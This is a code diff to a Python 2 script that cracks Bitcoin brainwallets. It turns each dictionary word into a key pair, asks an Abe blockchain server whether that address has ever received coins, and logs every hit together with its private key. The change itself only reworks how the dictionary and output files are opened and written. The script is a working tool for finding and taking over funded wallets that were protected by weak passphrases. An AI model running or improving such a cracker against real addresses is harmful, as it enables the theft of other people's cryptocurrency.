@@ -187,22 +187,24 @@ if __name__ == '__main__':
     abe_chain = "Bitcoin"
     print "Starting search for used brainwallet addresses using dictionary '%s'" % dict_file
 
-    num_lines = 0
-    with open(dict_file, 'r') as f:
-        lines = f.readlines()
-        num_lines = len([l for l in lines if l.strip(' \n') != ''])
+    num_lines = sum(1 for line in open(dict_file))
 
     line_count = 0
-    for line in open(dict_file):
+    found = codecs.open(found_file,'a','utf8')
+    dictionary = codecs.open(dict_file,'r','utf8')
+    for raw_line in dictionary:
         line_count += 1
-        a = get_addr(gen_eckey(passphrase=line.rstrip()))
+        line = raw_line.rstrip()
+        a = get_addr(gen_eckey(passphrase=line))
         address = a[0]
         private_address = a[1]
         received_bitcoins = urllib2.urlopen("http://%s:%s/chain/%s/q/getreceivedbyaddress/%s" % (abe_server, abe_port, abe_chain, address)).read()
         if(received_bitcoins != "0"):
             msg = "Found address %s using dictionary word %s which has received %s bitcoins. Private key: %s\n" % (address, line.rstrip(), received_bitcoins, private_address)
             print msg
-            with open(found_file, "a") as myfile:
-                myfile.write(msg)
+            found.write(msg)
         if( (line_count % 1000) == 0 ):
             print "Progress: %s of %s words checked so far" % (line_count, num_lines)
+            
+    found.close()
+    dictionary.close()
